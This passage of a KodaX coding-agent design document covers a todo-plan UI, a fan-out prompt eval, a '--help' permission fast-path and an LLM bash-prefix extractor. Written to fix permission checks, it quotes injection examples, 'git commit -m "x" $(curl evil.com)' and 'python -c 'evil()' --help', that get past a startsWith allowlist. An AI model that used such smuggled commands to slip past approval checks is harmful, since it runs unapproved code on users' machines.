  ⎿  ✓ Add unit test
     ● Run failing tests
     ☐ Wire CI
```

**四种状态枚举**（activityBar slot 行为表）：

| 状态 | spinner 活动？ | 有 todo？ | 渲染结果 |
|---|---|---|---|
| 1. 跑任务 + 有计划 | ✅ | ✅ | `⠋ Running tests…    1/3 completed` + `⎿` 块 |
| 2. 跑任务 + 无计划 | ✅ | ❌ | 仅 spinner 行：`⠋ Running tests…` |
| 3. idle + 有计划残留 | ❌ | ✅ | 仅 counter 行：`                  3/3 completed` + `⎿` 块（post-completion linger 期间） |
| 4. idle + 无计划 | ❌ | ❌ | activityBar 整体 unmount（slot 返回 undefined） |

四种状态视觉示意：

```
状态 1 — 跑任务 + 有计划（最常见）：
⠋ Running tests…                  1/3 completed
  ⎿  ✓ Add unit test
     ● Run failing tests
     ☐ Wire CI
> _

状态 2 — 跑任务 + 无计划（trivial 任务）：
⠋ Running tests…
> _

状态 3 — idle + 有完成 todo 残留（任务跑完，列表还挂）：
                                  3/3 completed
  ⎿  ✓ A
     ✓ B
     ✓ C
> _

状态 4 — idle + 无 todo（首次进入 / `/clear` 后）：
> _
```

状态 3 的 activityBar 是 flex-row 但左 `flexGrow=1` 列为空、仅右 column 有 counter。在 narrow 终端（< 40 columns）counter 可能被压到换行——已知 UX 限制，linger 时段窗口短，未列入 follow-up。

**Spinner glyph 说明**：示意图里的 `⠋` 是 KodaX `LoadingIndicator.tsx:70` Braille 动画 (`["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]`, 80ms 切帧) 的某一帧。KodaX **不**使用 CC 的静态 `✻` sparkle；FEATURE_151 全程没动 spinner glyph，KodaX 视觉识别保留。

不在范围（明确登记为"不做"）：
- **不加 expand 键 / 二态切换**——CC 用 `expandedView` 状态做"用户主动展开"切到 standalone 面板模式。KodaX 不补。Slice H 的嵌入态是默认且唯一态。

#### Slice I — Fan-Out Plan Granularity（review 类 fan-out 抱怨收口，2026-05-10 加入）

**触发**：用户实测（2026-05-09）— Worker 派 5 个 `dispatch_child_task` 做 review 时，整个 fan-out 期间用户看不到任何 plan list，UX 与 CC default subagent 路径差距明显。Slice A-H' 落地后 Worker plan 视觉机制完整，但 Worker 在 fan-out 任务下退化为「1 item / N child」的 plan 形态——问题不在机制层，在 prompt 引导层。

**根因（v6 分析锁定）**：

1. CC default Agent 工具路径下（[`runAgent.ts:747-806 for await query`](file:///c:/Works/claudecode/src/tools/AgentTool/runAgent.ts#L747-L806)）main agent 自己用 `TodoWrite` 写 plan、子 agent 黑盒——visibility 来自 **parent 的 plan 拆分**，不是 child 自己写 plan。CC 的 child plan 共享视图（`getTaskListId()` sessionId fallback）是机制基础，但**用户看到的"plan list"内容**来自 parent
2. KodaX [`worker-role-prompt.ts:48-56` PLAN-FIRST CONTRACT](../../packages/coding/src/agents/worker-role-prompt.ts#L48-L56) 没明确「fan-out 时 plan 应展开成 N item per child」
3. Worker 自然解读：5 次 `dispatch_child_task` = 1 个逻辑步骤 → 写 1 item plan。FEATURE_106 SCOPE COMMITMENT hard rule 进一步鼓励选粗粒度（"whatever scope you commit to is your contract"）
4. 退化结果：plan 列表 = 1 行 + 30 秒 spinner，等价于无 plan 列表

**设计**：[`worker-role-prompt.ts`](../../packages/coding/src/agents/worker-role-prompt.ts) 在 `dispatchRules` 段后追加 `FAN-OUT PLAN GRANULARITY` 段（约 10 行 prompt 文本，0 代码改动）：

```
FAN-OUT PLAN GRANULARITY:
- When your plan involves dispatching ≥3 children (dispatch_child_task per RULE
  A or RULE C), expand the plan to ONE item per child's objective (mirror each
  child's bundle.objective).
    GOOD:  todo_update({op:'init', items:[
             {id:'todo_1', content:"Review packages/foo", activeForm:"Reviewing packages/foo"},
             {id:'todo_2', content:"Review packages/bar", activeForm:"Reviewing packages/bar"},
             ... one per dispatched child ...
           ]})
    BAD:   todo_update({op:'init', items:[{content:"Fan out review across 5 packages"}]})
- Mark each item `in_progress` just before the corresponding `await_child_task`,
  and `completed` when that child returns successfully (`failed` on crash).
- Rationale: the plan list IS the user's progress dashboard during 30-60s
  fan-outs. Collapsing N dispatches into a single item turns parallel work
  into a black box and hides 30+ seconds of progress.
```

**与已落地 slice 的关系**：

- 依赖 Slice B1（`todo_update op:'init'` 全列表写入）— Worker 本来就用这个种入 plan，本 slice 仅强化 fan-out 场景下的 granularity 引导
- 依赖 Slice C（持久 visibility）— 5 行 plan 翻 completed 累积可见，不被 5s linger 清掉
- 协同 Slice F（Spinner verb fallback）— 每个 fan-out item 的 `activeForm` 自然进 spinner，提升 30-60s fan-out 期间的可读性

**视觉效果（落地后）**：

```
> review packages 1-5

⠋ Reviewing packages/foo                     1/6 completed
  ⎿  ✓ Plan review fan-out
     ◐ Review packages/foo
     ☐ Review packages/bar
     ☐ Review packages/baz
     ☐ Review packages/qux
     ☐ Review packages/quux
     ☐ Synthesize findings
```

3 分钟后所有 child 完成：

```
✓ Done                                       7/7 completed
  ⎿  ✓ Plan review fan-out
     ✓ Review packages/foo
     ✓ Review packages/bar
     ✓ Review packages/baz
     ✓ Review packages/qux
     ✓ Review packages/quux
     ✓ Synthesize findings
```

**显式不做（保留路线判断）**：

- ❌ **children-plan（Path B）** — 让 child 各自写 plan、共享 parent store + owner 字段。约 200 LoC 架构改动，超出 Path A scope。如果 P1a 偏好下用户后续仍想要 nested visibility（每 child 子 plan），再单独立 slice 评估
- ❌ **持久 child loop** — KodaX 当前 child 是 one-shot；持久 agent 协作 + idle wait + mailbox shutdown 协议是另一层 foundation，不是 plan visibility 范畴。详见 v0.7.38 ship 后单独讨论
- ❌ **CC TeamCreate 等价物** — KodaX [v0.7.10 FEATURE_027](v0.7.10.md#feature_027-adaptive-multi-agent-mode-toggle-and-team-mode-sunset) 已 sunset `--team` 模式；[v0.7.41 FEATURE_125](v0.7.41.md) 走 multi-instance LLM-First 差异化路径。不引入 programmatic team
- ❌ **Status indicator 实时活动栏（DeepSeek-TUI 右侧栏风格）** — P1b 视觉范畴（in_progress 流动），与 plan list（P1a 完成状态序列）解耦，独立讨论

**Eval**：[`tests/feature-151-fan-out-plan-granularity.eval.ts`](../../tests/feature-151-fan-out-plan-granularity.eval.ts) — Layer 2 single-turn probe（按 [`benchmark/EVAL_GUIDELINES.md`](../../benchmark/EVAL_GUIDELINES.md)）

| Case | Input scenario | Expected (mechanical assertion) |
|---|---|---|
| C1 | "review 3 modules independently" | 第 1 tool_use = `todo_update`, `op:'init'`, `items.length >= 3`，items 各含独立 module 名 |
| C2 | "review 5 packages" | 同上，`items.length >= 5` |
| C3 | "find the definition of function X" | 第 1 tool_use **不是** `todo_update`（trivial lookup 跳过 plan）|
| C4 | "grep for pattern Y in src/" | 同 C3 |

**Pre-registered 阈值**：

- Pass：C1 + C2 ≥ 80% probe 满足 `items.length >= 3 / 5`
- 且 C3 + C4 ≤ 20% probe 调 `todo_update`（防 over-trigger）
- 且跨 alias max-min spread ≤ 15pp（[FEATURE_109 AHE](v0.7.32.md) 标准）

**Sample size + 预算**：

- 探索期：anthropic-sonnet-4-6 + glm-coding，4 case × 5 sample × 2 alias = 40 probe ≈ $0.5
- 验证期（探索通过后）：补 kimi-coding + ds/v4 + gemini-25-pro = 5 alias × 4 case × 5 sample = 100 probe ≈ $1.5
- 总预算 ≤ $2

**决策表**：

| 实验结果 | 行动 |
|---|---|
| 全 pass | Ship；Worker fan-out 行为对齐 CC default 路径 |
| C1 / C2 fail（fan-out 不展开 plan）| 加强 prompt 措辞重跑；如再 fail，回退 prompt 不 ship |
| C3 / C4 fail（trivial 任务 over-trigger plan）| 加 trivial 启发式段落，重跑 |

##### Eval 实跑结果（2026-05-10，三轮迭代）

**Phase 1（探索期，单 alias `ds/v4flash`，N=10）**

| 版本 | review_3_modules | audit_5_packages | single_lookup | single_grep | overall positive |
|---|---|---|---|---|---|
| v1 prompt | 2/10 (20%) | 3/10 (30%) | 10/10 ✅ | 10/10 ✅ | 25% |
| v2 prompt | 6/10 (60%) | 5/10 (50%) | 10/10 ✅ | 10/10 ✅ | 55% |

v1→v2 整体提升 +30pp，但仍不到 80%。诊断：ds/v4flash 是地板模型，instruction-following 上限低；继续在地板上迭代落入 EVAL_GUIDELINES 反模式 5（micro-tweak blind retry）。决定按 SHIP-or-not 决策问题改走 Phase 2 multi-alias。

**Phase 2（验证期，5 alias × 4 case × 5 sample，N=100 probe）— v2 prompt + raw output dump**

> ⚠️ **方法论修正记录**（FEATURE_151 留下的 EVAL_GUIDELINES 反模式 7 教训）：第一次 Phase 2 跑只看 regex 聚合数据，得出"PARTIAL，kimi 引入 negative regression"的错误结论。第二次 Phase 2 加上 raw output dump 后用干净 context LLM-judge 系统性复核 100 runs，发现 **kimi 的"过触发"完全是 regex 假阴性**（kimi verbose-thinking 写 `I should NOT call todo_update` 被 regex 字面量匹配），且 **mmx/m27 的 review_3 失败也是 regex 假阴性**（用 `<minimax:tool_call>` 包装 + `review_N` ID 前缀）。LLM-judge 校正后 SHIP gate 才正确通过。

**LLM-judge 校正后真实数据**：

| Alias | review_3 (正面) | audit_5 (正面) | single_lookup (负面) | single_grep (负面) | 通过 SHIP gate？ |
|---|---|---|---|---|---|
| zhipu/glm51 | 3/5 (60%) | 3/5 (60%) | 5/5 ✅ | 5/5 ✅ | ❌ (positive < 80%) |
| kimi | 1/5 (20%) | 4/5 (80%) | 5/5 ✅ | 5/5 ✅ | ❌ (review_3 < 80%) |
| **mmx/m27** | **5/5 (100%)** | **4/5 (80%)** | **5/5 ✅** | **5/5 ✅** | **✅** |
| **ark/glm51** | **5/5 (100%)** | **5/5 (100%)** | **5/5 ✅** | **5/5 ✅** | **✅** |
| **ds/v4pro** | **5/5 (100%)** | **5/5 (100%)** | **5/5 ✅** | **5/5 ✅** | **✅** |

**Phase 2 SHIP gate 判定**：≥3 of 5 aliases 同时满足"两个 positive ≥80% AND 两个 negative ≤20% 误触发" → **3 of 5（mmx/m27 + ark/glm51 + ds/v4pro）通过 → SHIP**。

**zhipu/kimi 真实失败模式**：narration-only —— 模型说"I'll plan first, then dispatch..."但单 turn 内没真发 `todo_update` tool call。这是单 turn probe 对 verbose 模型的限制，**不是 v2 prompt 的 regression**：在生产多 turn agent loop 里第二 turn 模型自然会发 tool call，UX 仍然完整。test-guide 会标注这两家为已知 verbose-style provider，建议 reviewer 在这些模型上做手测复核。

**总成本**：Phase 1 v1+v2 ≈ $0.8 + Phase 2 (两次跑，第二次为加 dump 重跑) ≈ $6 + LLM-judge 0 增量 ≈ **$7**。EVAL_GUIDELINES 区间内。换的决策：(a) Slice I v2 ship；(b) EVAL_GUIDELINES 反模式 7 + raw output preservation 沉淀（同样 ship-blocking 重要）。

**未来引用**：FEATURE_151 Slice I 是 EVAL_GUIDELINES 反模式 7（regex 否定断言假阴性）的 reference 案例。raw output dump 路径：`os.tmpdir()/kodax-eval-dumps/feature-151-fan-out-plan-granularity/<case>.json`，本地保留供事后审计。

### Implementation Surface

| 文件 | Slice | LoC est |
|---|---|---|
| `packages/repl/src/ui/view-models/todo-plan.ts` | A | ~10 |
| `packages/repl/src/ui/InkREPL.tsx` | A + C + F + H' | ~50（drop spinner gate + drop linger useEffect + 5 个 session-boundary `setTodoItems([])` + spinner verb content fallback + activityBar 改 flex-row 装 counter）|
| `packages/coding/src/tools/todo-update.ts` | B1 | ~50（init op 实现 + schema）|
| `packages/coding/src/tools/todo-list.ts` | D | ~70（新文件 — `todo_list` 工具实现）|
| `packages/coding/src/tools/registry.ts` | B1 + D | ~50（schema 字段 + description + `todo_list` 注册）|
| `packages/coding/src/task-engine/todo-throttle-reminder.ts` | B2 | ~10（drop hasItems + 双分支 text）|
| `packages/coding/src/task-engine/_internal/managed-task/role-prompt.ts` | B3 | ~10（三个 role 各加一行）|
| `packages/coding/src/task-engine/runner-driven.ts` | D + D-followup | ~17（`todo_list` 在 `KodaXCodingTools` interface + **Scout / Planner / Generator / Evaluator 四角色** toolset 中注入 —— 见下方"`todo_list` 角色注入决策"）|
| `packages/coding/src/agent-runtime/event-emitter.ts` | E | ~10（`HIDDEN_TODO_TOOL_NAMES` set） |
| `packages/repl/src/ui/components/TodoListSurface.tsx` | G→H→H' | ~25（删 per-row `▏` gutter + 删 counter 渲染；只剩 `⎿` 一次性 connector 包 rows） |
| `packages/repl/src/ui/components/TodoListSurface.test.tsx` | G→H→H' | ~15（counter assertion 全删；新增 ⎿ 出现 1 次 + `▏` 不出现 + counter 不出现的断言） |
| `packages/coding/src/agents/worker-role-prompt.ts` | I | ~12（`fanOutPlanGranularity` 段追加 + 加入 parts 数组，0 代码改动）|
| `packages/coding/src/agents/worker-role-prompt.test.ts` | I | ~10（unit pin：返回字符串含 `FAN-OUT PLAN GRANULARITY` sentinel + 含 `dispatch_child_task` 引用）|
| `tests/feature-151-fan-out-plan-granularity.eval.ts` | I | ~80（4 case × 5 alias × 5 sample，pre-registered 阈值 + decision matrix）|

#### `todo_list` 角色注入决策（2026-05-09，含追加决议）

**最终决议：四角色全注入**（Scout / Planner / Generator / Evaluator）。

**初版（Slice D）选择三角色**：仅 Scout / Planner / Generator，与 `todo_update`（写工具）同 scope。理由是 KodaX role-restriction 哲学—— Evaluator 本职是"判定刚跑完 step 的输出"，不属于"管 plan 全局"。

**评审追加决议（2026-05-09）覆盖初版**：用户在评审 reviewer HIGH 后明确要求把 `todo_list` 加到 Evaluator。理由：
- `todo_list` 是 read-only，跟 Evaluator 已有的 `read` / `grep` / `glob` / `readOnlyBash` 性质一致——读取范围不冲突
- Evaluator 知道完整 plan state 可以产出更上下文化的 verdict（"还剩 4 步，部分通过可接受" vs "最后一步，要求严格"）
- 不会污染 user transcript（`HIDDEN_TODO_TOOL_NAMES` 已覆盖）
- 不会重置 throttle reminder counter（counter 只 reset on `todo_update`，不 reset on `todo_list`）
- 不会触发 Evaluator 写 plan：Evaluator 没有 `todo_update`，只能读

**未来 AMA 演化的 caveat**（**重要**）：

未来增加新角色（FEATURE_125 团队模式 / 子角色拆分 / 评审角色细化等）或拆分现有角色时，**必须显式决定**新角色是否注入 `todo_list`。**不要因为它是 read-only 就 default-include**——这是错误的启发式：
- read-only-ness 不是 gate，**角色职责才是**
- 如果新角色的本职**完全独立于 plan 全局**（例如纯文本格式化、单文件 lint、metrics 收集），不应注入 `todo_list`，避免 LLM 在不该 query plan 的场景下 query plan、浪费 tokens 走错路径
- 如果新角色的本职**需要参考 plan 上下文**（例如 PR 描述生成、verification report、跨 step coordination），应注入

代码注释 [`runner-driven.ts:2335-2353`](../../packages/coding/src/task-engine/runner-driven.ts#L2335-L2353) 已包含此 caveat，未来 reviewer / contributor 改 AMA 拓扑时会被提醒。

**测试**：
- `packages/repl/src/ui/view-models/todo-plan.test.ts`：MIN=1 + 无 linger expiry pinning
- `packages/coding/src/tools/todo-update.test.ts`：init op 全套 hermetic 测试（创建、替换、合法性、与 update op 互斥）
- `packages/coding/src/task-engine/todo-throttle-reminder.test.ts`：empty store 现在 fires + 双分支 text format
- `tests/feature-151-todo-self-seeding.eval.ts`：FEATURE_104 prompt eval（5 alias × 4 case，验证 LLM 在「Scout 不 seed 但任务多步骤」场景下能自发调 op:'init'）
- `tests/feature-151-fan-out-plan-granularity.eval.ts`：Slice I prompt eval（5 alias × 4 case × 5 sample，验证 Worker 在 ≥3 child fan-out 场景下展开 plan 成 N item per child；trivial 任务不 over-trigger）
- `packages/coding/src/agents/worker-role-prompt.test.ts`：Slice I unit pin（`buildWorkerInstructions` 返回字符串含 `FAN-OUT PLAN GRANULARITY` 段 + 含 `dispatch_child_task` / `await_child_task` 引用，防 prompt 漂移）

### 与下游 feature 的影响评估

| Feature | 版本 | 影响 | 处理 |
|---|---|---|---|
| FEATURE_113 TodoList JSON / CLI Surface | v0.8.2 | `KodaXEvents.onTodoUpdate` event 流增加来自 LLM `init` op 的来源；事件 payload schema 不变（仍是 `TodoList` snapshot）| v0.8.2.md 加一行注：JSON event consumer 不需要区分种入路径 |
| FEATURE_120 Async Child Steering | v0.7.39 | 无（child 流程独立）| 无 |
| FEATURE_124 Memory System | v0.7.43 | 未来可选：把跨 prompt 的 todo state 持久化到 memory；本 feature 不做 | 无变更 |
| FEATURE_125 Team Mode | v0.7.41 | 多 agent 共享 todo state 是 future scope；本 feature 仍然是 per-Ink-session in-memory | 无变更 |

### 不在 scope

- **G2 obligations >= 2 改 >= 1**：保留——这与 CC prompt「≥3 steps 才用 TodoWrite」哲学一致。简单任务由 LLM 通过 trivial-exemption 路径跳过 plan，避免噪音。
- **跨 Ink-session 持久化（写盘 / `~/.kodax/`）**：列入 FEATURE_124 v0.7.43 Memory System scope。
- **`kodax todos --watch` CLI 命令**：FEATURE_113 v0.8.2 scope，本 feature 不预留。
- **runner 启动时若全部 terminal 则自动 reset**：列入 follow-up 观察项，等用户反馈再决定。

### Anchors

- KodaX 既存代码：[`packages/coding/src/task-engine/todo-store.ts`](../../packages/coding/src/task-engine/todo-store.ts)、[`packages/coding/src/tools/todo-update.ts`](../../packages/coding/src/tools/todo-update.ts)、[`packages/coding/src/task-engine/todo-throttle-reminder.ts`](../../packages/coding/src/task-engine/todo-throttle-reminder.ts)、[`packages/repl/src/ui/view-models/todo-plan.ts`](../../packages/repl/src/ui/view-models/todo-plan.ts)、[`packages/repl/src/ui/components/TodoListSurface.tsx`](../../packages/repl/src/ui/components/TodoListSurface.tsx)
- CC 对照：`c:/Works/claudecode/src/tools/TodoWriteTool/TodoWriteTool.ts`、`c:/Works/claudecode/src/components/TaskListV2.tsx:89`、`c:/Works/claudecode/src/utils/attachments.ts:254` (`TODO_REMINDER_CONFIG`)、`c:/Works/claudecode/src/utils/attachments.ts:3266` (`getTodoReminderAttachments`)、`c:/Works/claudecode/src/screens/REPL.tsx:4606`

---

## FEATURE_154: Universal `--help` Fast-Path

### 背景

[Issue 129](../KNOWN_ISSUES.md#129) 收尾后做 KodaX vs `c:/Works/claudecode/src/` auto-mode 体验对照，发现 CC 的 `cmd --help` 类命令**完全不弹**确认，原因是 [`commands.ts:388-436 isHelpCommand`](C:\Works\claudecode\src\utils\bash\commands.ts#L388-L436) fast-path 让任何形态为 `<cmd> [<subcmd> ...] --help` 的命令绕过两层 LLM 调用：(1) Haiku prefix extractor (`getCommandPrefix` + `BASH_POLICY_SPEC`)，(2) YOLO classifier (`classifyYoloAction`)。

KodaX 当前 [`permission.ts:68-76`](../../packages/repl/src/permission/permission.ts#L68-L76) 的 `isSingleBashReadCommand` 内有一个**硬编码 12 个语言工具**的 `languageTools` carve-out，只对 `node` / `npm` / `yarn` / `pnpm` / `tsc` / `python` / `pip` / `go` / `cargo` / `rustc` / `ruby` / `perl` 这 12 个命令的 `-v` / `--version` / `-h` / `--help` 放行。**用户实战痛点**：跑 `docker --help` / `kubectl --help` / `terraform --help` / `aws --help` / `gh --help` 等任何不在白名单的工具，都会触发 FEATURE_092 auto-mode classifier LLM 调用 —— 每次浪费 ~200-500 token + 引入 ~2-8 秒延迟（取决于 classifier 模型）。

### 设计

新增纯函数 [`isHelpCommand(command: string): boolean`](../../packages/repl/src/permission/permission.ts) 复刻 CC 行为。判定规则严格：

| 规则 | 通过 | 拒绝 |
|---|---|---|
| `trim()` 后必须以 `--help` 结尾 | `python --help` ✓ | `python -h` ✗、`--help python` ✗ |
| 不能含 `'` `"` 引号 | `git log --help` ✓ | `python -c 'evil()' --help` ✗ |
| `--help` 必须是唯一 flag | `kubectl --help` ✓ | `python --help --version` ✗、`node --no-warnings --help` ✗ |
| 非 flag token 必须匹配 `/^[a-zA-Z0-9]+$/` | `git log --help` ✓ | `./bin/foo --help` ✗、`python script.js --help` ✗、`foo $VAR --help` ✗ |

加在 [`isBashReadCommand`](../../packages/repl/src/permission/permission.ts) 顶部 fast-path（早于 null-device strip 和 baseIllegalSyntax 检查）。命中即返回 `true`，调用方一路放行：[`executor.ts:197-199`](../../packages/repl/src/permission/executor.ts#L197-L199) 直接执行，不进 `confirmTools` 流程，不调 LLM classifier。

**严格于 CC 一处**：CC 用 `shell-quote` 解析 token，`$VAR` 是 object 类型 token，loop 中跳过非 string token，等于变相允许 `foo $VAR --help`。KodaX 简单 `split(/\s+/)` 把 `$VAR` 当成 string token，命中 `^[a-zA-Z0-9]+$` 拒绝模式。这是有意的安全保守 —— `$VAR` 在 shell 展开后语义不可预测，不应进 fast-path。

### 与既有语言工具 carve-out 的关系

`isSingleBashReadCommand` 的 `languageTools` 分支 ([`permission.ts:68-76`](../../packages/repl/src/permission/permission.ts#L68-L76)) **保留**，原因：

| 命令 | FEATURE_154 fast-path | languageTools 分支 |
|---|---|---|
| `python --help` | ✓（fast-path 命中即返回） | 不 reach |
| `node -h` | ✗（不以 `--help` 结尾） | ✓ 命中 `-v\|--version\|-h\|--help` 白名单 |
| `npm --version` | ✗ | ✓ |
| `node script.js` | ✗ | ✗ 拒绝（`script.js` 不是 info flag） |
| `docker --help` | ✓ | docker 不在 languageTools 列表，原本就走通用分支 |

FEATURE_154 收紧的不是语言工具，是**通用任意命令的 `--help`**。`-v` / `--version` / `-h` 等其他 info flag 仍是语言工具专享 —— CC 也没有 fast-path 它们，这是合理的（`* -h` 在很多 CLI 里是其他含义，不安全泛化）。

### 验收标准

- 单元测试 [`permission.test.ts`](../../packages/repl/src/permission/permission.test.ts) `describe('isHelpCommand — universal --help fast-path (FEATURE_154)')` 全绿（10 cases）
- 集成断言：`isBashReadCommand('docker --help')` / `'kubectl --help')` / `'terraform --help')` / `'git status --help')` 全 `true`
- 回归断言：`isBashReadCommand('node script.js')` 仍 `false`（语言工具脚本仍被拒）
- 无 regression：[`tool-confirmation.test.ts`](../../packages/repl/src/common/tool-confirmation.test.ts) 8/8 + [`types.test.ts`](../../packages/repl/src/permission/types.test.ts) 12/12 + [`tracker-consistency.test.ts`](../../tests/tracker-consistency.test.ts) 4/4 + 全 src/permission/* 全绿
- `npm run build` 通过

### 非目标

- **泛化 `-v` / `--version` / `-h` / `-help`**（无 `-`）到任意命令：CC 没做，理由是上述 short flag 在很多 CLI 里有其他语义，无法安全泛化。例：`grep -h` 是 `--no-filename`，`tar -h` 是 `--dereference`。
- **基于 LLM 的 prefix extractor（FEATURE_153 scope）**：本 feature 是规则层 fast-path，独立于 LLM prefix。两者并存：`* --help` 走 154，其他形态走 153 + 092。
- **AST-based parser（FEATURE_152 scope）**：本 feature 用简单 `split(/\s+/)`，不依赖 `shell-quote`。FEATURE_152 落地后 `isHelpCommand` 内部仍维持 simple split（更直接、更快），不切到 AST。
- **缓存命中结果**：函数 ~50 LoC pure，每次调用 < 1μs，无需缓存。

### 与其他 Feature 的关系

- **FEATURE_092 (v0.7.33) auto-mode classifier**：FEATURE_154 fast-path 命中的命令绕过 [`guardrail.ts:251 beforeTool`](../../packages/coding/src/guardrails/auto-mode/guardrail.ts#L251) 的 `classify(...)` 调用。fast-path miss 的命令仍走 LLM 分类器。
- **Issue 129 (v0.7.38)**：解决了 `2>NUL` / 管道误判等规则层假阳性，让 LLM classifier 拿回非平凡命令的主决策权。FEATURE_154 进一步减少 trivial 命令（`* --help`）的 LLM 调用频次。两者方向一致：**正确判定平凡命令安全 → LLM 只用在真正需要判断的边界 case**。
- **FEATURE_152 (v0.7.38)**：AST migration 不替换 `isHelpCommand` 内部实现 —— help 判定逻辑足够简单，simple split 比 AST walk 更直接。FEATURE_152 替换的是 `isBashReadCommand` 主路径的 regex 解析。
- **FEATURE_153 (v0.7.38)**：LLM prefix extractor 替代字符串 startsWith 匹配 `Bash(git commit:*)` 类用户允许列表。FEATURE_154 与 153 完全正交：154 处理"无需 LLM 的命令"，153 处理"需 LLM 抽 prefix 的命令"。

### 参考

- CC 实现：[`c:/Works/claudecode/src/utils/bash/commands.ts:388-436`](C:\Works\claudecode\src\utils\bash\commands.ts#L388-L436)
- KodaX 现有 `languageTools` carve-out：[`packages/repl/src/permission/permission.ts:68-76`](../../packages/repl/src/permission/permission.ts#L68-L76)
- 触发本 feature 的 Issue 129：[`docs/KNOWN_ISSUES.md#129`](../KNOWN_ISSUES.md#129)
- ADR-023：[`docs/ADR.md#adr-023`](../ADR.md#adr-023-bash-command-parsing--regex--ast-migration-feature_152-v0738)

---

## FEATURE_153: LLM-Backed Bash Prefix Extractor

### 背景

[Issue 129](../KNOWN_ISSUES.md#129) 收尾后做 KodaX vs `c:/Works/claudecode/src/` auto-mode 体验对照，发现一个**安全漏洞**：KodaX 的 `accept-edits` 模式 bash allowlist 用朴素 `command.startsWith(pattern)` 匹配——`Bash(git commit:*)` 配置的用户，命令 `git commit -m "x" $(curl evil.com)` 直接命中 `startsWith('git commit')` 走 auto-allow，命令注入完全逃过授权。

CC [`commands.ts:438-499 BASH_POLICY_SPEC`](C:\Works\claudecode\src\utils\bash\commands.ts#L438-L499) + [`utils/shell/prefix.ts:createCommandPrefixExtractor`](C:\Works\claudecode\src\utils\shell\prefix.ts) 用 LLM 提取命令的 SAFE PREFIX，allowlist 匹配的是抽取出来的前缀（精确相等），而不是裸命令。LLM 的提示工程要求返回三种结果之一：

| 返回 | 含义 | 后续处理 |
|---|---|---|
| `command_injection_detected` | 命令含注入字符（`$()` / `\`\`` / `;` / 链式 `&&` 等可执行另一个命令的语法） | 任何 allowlist 都不能匹配，强制走确认 |
| `none` | 命令无法抽取安全前缀 | 同上 |
| `<safe-prefix>` | 安全前缀（必须是命令的字面前缀） | 仅当 `extractedPrefix === pattern` 才匹配（精确相等，不是 startsWith） |

### 设计

#### 1. 抽取器模块 [`packages/coding/src/guardrails/auto-mode/bash-prefix-extractor.ts`](../../packages/coding/src/guardrails/auto-mode/bash-prefix-extractor.ts)

| 组件 | 说明 |
|---|---|
| `BASH_POLICY_SPEC` | LLM 系统提示（**逐字移植 CC `commands.ts:438-499`**——保留 CC 大规模生产验证过的提示工程） |
| `extractCommandPrefix(opts)` | 单次未缓存抽取，通过 `sideQuery` 调用任意 KodaX provider |
| `BashPrefixResult` | 三种判定 kind：`prefix` / `injection_detected` / `no_prefix` |
| `validatePrefixResponse` | LLM 输出 post-parse 安全网：拒绝 bare `git`（太宽泛）、`bash` / `sh` / `cmd` / `powershell` 等危险 shell prefix、不是命令字面前缀的 hallucination |
| `createBashPrefixExtractor(opts)` | LRU cache（200 entries）+ identity-guard rejection eviction 工厂 |

**关键设计**：
- **`provider` 改为 `getProvider: () => KodaXBaseProvider` live getter**：mid-session `/provider` + `/model` 切换时无需重建 extractor，直接走最新 provider/model。对齐 FEATURE_092 hotfix-3 的 LIVE getter 模式。
- **抛错而非返回 `no_prefix` 处理 transient failure**（timeout / network / abort）：让 LRU cache 的 `.catch` eviction 能触发——失败的 cache slot 不能被后续命中，必须 retry。Mirrors CC `prefix.ts:114-118`。
- **identity-guard cache cleanup**：rejection 的 `.catch` 删除 cache slot 前先验证 slot 仍然指向同一 promise（防止 LRU eviction 已经替换了 slot 的 race）。
- **不调 KodaX 已有的 Haiku-specific helper**——直接用 `sideQuery`（每个 provider 的 wrapper 已经做了 cost/abort/timeout），KodaX 习惯"用主模型"，不强加 provider 选择。

#### 2. 权限闸门改造 [`packages/repl/src/permission/permission.ts`](../../packages/repl/src/permission/permission.ts)

- `isToolCallAllowed`：sync → async + 可选 `extractor?: BashPrefixExtractor` + 可选 `signal?: AbortSignal`。
- `matchesBashPattern` 拆为两条：
  - `matchesBashPatternByExtractedPrefix(extractedPrefix, pattern)`：精确相等（FEATURE_153 路径）
  - `matchesBashPatternLegacy(command, pattern)`：原 `startsWith`（仅留作 SDK headless consumer fallback，**生产 4 个 call site 全部传 extractor，无新旧并行**）
- **失败闭路**：`extractor.extract()` throw 时 `isToolCallAllowed` 返回 `false` → caller fall through 到标准确认弹窗，而不是 unhandled rejection 炸到 tool-execution loop。集中在 `isToolCallAllowed` 内部一个 try/catch 保护所有 4 个 call site。

#### 3. PermissionContext 字段

```ts
interface PermissionContext {
  // ... existing fields
  bashPrefixExtractor?: BashPrefixExtractor;
}
```

#### 4. 4 个生产 call site 改造（无并行 cutover）

| Call site | Bootstrap | Cache scope |
|---|---|---|
| [`packages/repl/src/interactive/repl.ts:497`](../../packages/repl/src/interactive/repl.ts#L497) | `runInteractiveMode` 启动时 `createBashPrefixExtractor`，live getter 读 `currentConfig` | per-REPL session |
| [`packages/repl/src/ui/InkREPL.tsx`](../../packages/repl/src/ui/InkREPL.tsx) | `useRef<BashPrefixExtractor \| null>(null)` lazy init + `currentConfigRef` 同步 useEffect | per-component instance |
| [`src/acp_server.ts`](../../src/acp_server.ts) | `KodaXAcpServer` 构造函数字段，所有 session 共享 cache | per-server instance（LRU 200 cap 边界内存） |
| [`packages/repl/src/permission/executor.ts`](../../packages/repl/src/permission/executor.ts) | `createPermissionContext` factory 接收 `bashPrefixExtractor` 选项，独立 `executeWithPermission` 路径全覆盖 | inherits caller's |

### 验收标准

- 单元测试 [`bash-prefix-extractor.test.ts`](../../packages/coding/src/guardrails/auto-mode/bash-prefix-extractor.test.ts) 19/19 全绿（覆盖 prefix 抽取 / injection / 危险 shell 拒绝 / hallucination guard / LRU eviction / dedupe / 失败重试 / live `getModel` 切换 / abort）
- 单元测试 [`permission.test.ts`](../../packages/repl/src/permission/permission.test.ts) `describe('isToolCallAllowed (FEATURE_153 extractor path)')` 10/10 全绿（prefix-match / injection blocked / no_prefix blocked / wider-pattern miss / exact pattern / bare Bash bypass / no-bash-pattern skip / legacy fallback / `*` rejection / **throw fail-closed**）
- 攻击 case 验证：`Bash(git commit:*)` 配置下，`git commit -m "x" $(curl evil)` LLM 返回 `injection_detected` → `isToolCallAllowed` 返回 `false` → 走确认弹窗（不再是 startsWith 静默 auto-allow）
- 兜底 case 验证：transient LLM timeout 不导致 unhandled rejection，`isToolCallAllowed` 返回 `false` 走确认弹窗
- 完整 build：`npm run build` 跨 9 个包绿

